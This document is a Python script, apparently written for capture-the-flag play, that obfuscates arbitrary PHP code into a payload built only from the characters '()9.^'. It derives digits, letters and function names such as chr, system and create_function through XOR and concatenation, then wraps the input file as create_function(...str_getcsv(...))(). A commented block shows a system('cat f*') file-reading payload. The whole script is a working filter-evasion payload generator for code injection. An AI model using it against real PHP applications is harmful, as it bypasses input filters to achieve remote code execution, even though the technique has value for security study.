#!/usr/bin/env python3
# usage: ./phpfuck.py <in_file.php> <out_file.php>
from functools import reduce
import string
import itertools
import json
import sys

# dictionary that contains our mappings
p = {}

def gen_xor(*args):
    #fn = lambda a,b: f'({a})^({b})'
    #return reduce(fn, args[1:], args[0])
    return '^'.join([f'({a})' for a in args])

def gen_concat(*args):
    #fn = lambda a,b: f'({a}).({b})'
    #return reduce(fn, args[1:], args[0])
    return '.'.join([f'({a})' for a in args])

p['INF9'] = '('+'9'*309+').(9)'
p[9] = '9'
p[0] = '9^9'
p['99'] = '(9).(9)'                            # (9).(9) == '99'   //concatenates '9' and '9'
p[106] = '9^99'
p['1069'] = gen_concat(p[106], p[9])
p['09'] = gen_concat(p[0], p[9])
p['80'] = gen_xor(p['09'], p['1069'], p['99'])
p[51] = gen_xor(p['80'], '99')
p['519'] = gen_concat(p[51], '9')
p['48'] = gen_xor(p['519'], p['80'], p['99'])

p[3] = gen_xor(p[51], p['48'])                 # 51 ^ '48' === 3   //'48' gets cast to 48
p['00'] = gen_concat(p[0], p[0])
p['080'] = gen_concat(p[0], p['80'])
p['01'] = gen_xor(p['00'], p['080'], p['09'])  # '00' ^ '080' ^ '09' === '01'
p[1] = gen_xor(p['01'], p[0])                  # '01' ^ 0 === 1    //'01' gets cast to 1
p[2] = gen_xor(p['01'], p[3])
p[8] = gen_xor(p['01'], p[9])
p['39'] = gen_concat(p[3], '9')
p['32'] = gen_concat(p[3], p[2])
p[7] = gen_xor(p['39'], p[0], p['32'])
p[6] = gen_xor(p[7], p[1])
p[5] = gen_xor(p[7], p[2])
p[4] = gen_xor(p[5], p[1])
# we now have every digit from 0-9



# we can generate any number by concatenating digits from 0-9
def gen_num_as_str(n):
    ns = str(n)
    ns = [p[int(d)] for d in ns]
    return gen_concat(*ns)

def gen_num(n):
    global p
    # we xor the number string with 0 to cast to int
    if n not in p:
        return gen_xor(gen_num_as_str(n), p[0])
    else:
        return p[n]


# generate all 2-digit strings
for a,b in itertools.product(range(10), range(10)):
    key = f'{a}{b}'
    payload = gen_concat(p[a], p[b])
    if key not in p or len(payload) < len(p[key]):
        p[key] = payload

def sxor2(s1, s2):
    return bytes([s1[i] ^ s2[i] for i in range(min(len(s1), len(s2)))])

def sxor(*args):
    return reduce(sxor2, args[1:], args[0])

# below code was used to find valid php functions that we can make with what we currently have
# We can generate 2-digit strings, 'INF', and xor them together to get other strings
'''
valid = {}
fn_name_charset = string.ascii_uppercase + string.ascii_lowercase + string.digits + "_"
#fn_name_charset = string.ascii_uppercase + string.ascii_lowercase + "_"
for a,b,c,d in itertools.product(range(10), range(10), range(10), range(10)):
    res = sxor(b'INF', f'{a}{b}'.encode(), f'{c}{d}'.encode())
    valid[res.decode().lower()] = f'INF ^ {a}{b} ^ {c}{d}'

for a,b,c,d,e,f in itertools.product(range(10), range(10), range(10), range(10), range(10), range(10)):
    res = sxor(b'INF', f'{a}{b}'.encode(), f'{c}{d}'.encode(), f'{e}{f}'.encode())
    valid[res.decode().lower()] = f'INF ^ {a}{b} ^ {c}{d} ^ {e}{f}'

for a,b,c,d,e,f in itertools.product(range(10), range(10), range(10), range(10), range(10), range(10)):
    res = sxor(b'INF', b'0IN', f'{a}{b}'.encode(), f'{c}{d}'.encode(), f'{e}{f}'.encode())
    valid[res.decode().lower()] = f'INF ^ 0IN ^ {a}{b} ^ {c}{d} ^ {e}{f}'

valid2 = {k: v for k, v in valid.items() if all([c in fn_name_charset for c in list(k)])}

def can_make_function(fname):
    global valid2
    if len(fname) % 2 == 0:
        chunks = [fname[i:i+2] for i in range(0, len(fname), 2)]
        if all([chunk in valid2 for chunk in chunks]):
            return True
    return False

with open('php_functions.json', 'r') as f:
    php_fns = json.loads(f.read())
    print(len(php_fns))
    valid_php_fns = list(filter(can_make_function, php_fns))
    print(len(valid_php_fns))
'''
# output list:
# ['each', 'define', 'strtok', 'strstr', 'trim', 'join', 'sscanf', 'linkinfo', 'link', 'system', 'ceil', 'sqrt', 'bindec', 'decbin', 'fmod', 'intval', 'floatval', 'strval', 'feof', 'copy', 'file', 'glob', 'lchgrp', 'mail', 'next', 'dl']

# we call JOIN() to generate the NULL value
# 'jo' = 'INF' ^ '79' ^ '48'
# 'in' = 'INF' ^ '99' ^ '99'
#p['JO'] = gen_xor(p['INF9'], gen_num_as_str(79), gen_num_as_str(48))
#p['IN'] = gen_xor(p['INF9'], p['99'], p['99'])
#p['JOIN'] = gen_concat(p['JO'], p['IN'])

# JOIN() doesnt work in php8 and throws annoying warnings. use strtOK(9) instead
p['st'] = gen_xor(p['INF9'], p['00'], p['33'], p['99'])
p['rt'] = gen_xor(p['INF9'], p['03'], p['39'], p['80'])
p['OK'] = gen_xor(p['INF9'], p['12'], p['77'])
p['strtOK'] = gen_concat(p['st'], p['rt'], p['OK'])

# This block gives us significantly shorter payloads, but it increases execution time by a lot
# generate pairs of 2 capital letters by XORing with INF
'''
for a,b,c,d in itertools.product(range(10), range(10), range(10), range(10)):
    res = sxor(b'INF', f'{a}{b}'.encode(), f'{c}{d}'.encode())
    res = res.decode('ascii')
    payload = gen_xor(p['INF9'], p[f'{a}{b}'], p[f'{c}{d}'])
    if res not in p or len(payload) < len(p[res]):
        p[res] = payload
        if res=='OK':
            print('OK', a,b,c,d)

# generate pairs of 2 lowercase letters by XORing with INF
for a,b,c,d,e,f in itertools.product(range(10), range(10), range(10), range(10), range(10), range(10)):
    # lowercase letters
    res = sxor(b'INF', f'{a}{b}'.encode(), f'{c}{d}'.encode(), f'{e}{f}'.encode())
    res = res.decode('ascii')
    payload = gen_xor(p['INF9'], p[f'{a}{b}'], p[f'{c}{d}'], p[f'{e}{f}'])
    if res not in p or len(payload) < len(p[res]):
        p[res] = payload
'''

def gen_funccall(fname, arg):
    return f'({fname})({arg})'


p['CH'] = gen_xor(p['INF9'], p['31'], p['97'])
# Call JOIN() to obtain NULL
#p[False] = gen_funccall(p['JOIN'], '')

# Call strtOK(9) to obtain false
# This is better than JOIN() because it doesn't throw a warning
p[None] = gen_funccall(p['strtOK'], '9')
# Now that we have NULL, we can create a length-1 string via (9).null
p['9'] = gen_concat('9', p[None])

# we can xor any string x^'99'^'9' to trim it to the first character
def try_gen_single_char(c):
    global p
    keys_starting_with_c = {k:v for k,v in p.items() if type(k)==str and k.startswith(c)}
    if len(keys_starting_with_c) > 0:
        keylens = {k: len(v) for k,v in keys_starting_with_c.items()}
        min_key = min(keylens, key=keylens.get)
        min_payload = keys_starting_with_c[min_key]
        return gen_xor(min_payload, p['99'], p['9'])
    else:
        return False

p['r~'] = gen_xor(p['INF9'], p['09'], p['39'], p['80'])
# TODO - shorter 'r' payload? - gen_xor(p['INF9'], p['70'], p['59'], p['9'])
p['r'] = gen_xor(p['r~'], p['99'], p['9'])
# we can now call 'chr' to obtain any character!
p['CHr'] = gen_concat(p['CH'], p['r'])

def gen_char(c):
    global p
    if c in p:
        return p[c]
    elif try_gen_single_char(c):
        return try_gen_single_char(c)
    else:
        return gen_funccall(p['CHr'], gen_num(ord(c)))

def gen_char_caseinsensitive(c):
    global p
    # TODO - make it find the minimum-length one
    if c.upper() in p:
        return p[c.upper()]
    elif c.lower() in p:
        return p[c.lower()]
    elif try_gen_single_char(c.upper()):
        return try_gen_single_char(c.upper())
    elif try_gen_single_char(c.lower()):
        return try_gen_single_char(c.lower())
    else:
        return gen_funccall(p['CHr'], gen_num(ord(c)))


def gen_str_caseinsensitive(s):
    global p
    # TODO - make it find the minimum-length one
    if s in p:
        return p[s]
    chunks = [s[i:i+2] for i in range(0, len(s), 2)]

    to_concat = []
    for chunk in chunks:
        if chunk.upper() in p:
            to_concat += [p[chunk.upper()]]
        elif chunk.lower() in p:
            to_concat += [p[chunk.lower()]]
        else:
            to_concat += [gen_char_caseinsensitive(c) for c in chunk]
    return gen_concat(*to_concat)

def gen_str(s):
    global p
    if s in p:
        return p[s]
    chunks = [s[i:i+2] for i in range(0, len(s), 2)]
    to_concat = []
    for chunk in chunks:
        if chunk in p:
            to_concat += [p[chunk]]
        else:
            to_concat += [gen_char(c) for c in chunk]
    return gen_concat(*to_concat)


# Use this block if you just want system =)
'''
system = gen_str_caseinsensitive('system')
PAYLOAD = 'cat f*'
evald_function = gen_funccall(system, gen_str(PAYLOAD))
'''

# we use create_function() to create a new function that we can execute
create_function = gen_str_caseinsensitive('create_function')
# we use str_getcsv to create an argument array to pass in to create_function()
str_getcsv = gen_str_caseinsensitive('str_getcsv')


with open(sys.argv[1], 'r') as f:
    PAYLOAD = f.read()

# escape double quotes for csv
PAYLOAD = PAYLOAD.replace('"', '""')
# newlines aren't needed and break the CSV
PAYLOAD = PAYLOAD.replace('\n', '')
#print(f',"{PAYLOAD}"')

csv = gen_str(f',"{PAYLOAD}"')
create_function_args = gen_funccall(str_getcsv, csv)
new_function = gen_funccall(create_function, f'...({create_function_args})')
evald_function = f'{new_function}()'
# our final payload looks like: create_function(...str_getcsv(",$PAYLOAD"))()
print(len(evald_function))
print(set(evald_function))
assert set(evald_function) == set('()9.^')

with open(sys.argv[2], 'w+') as f:
    f.write(evald_function)
    #f.write(system_call)

print("Done!")

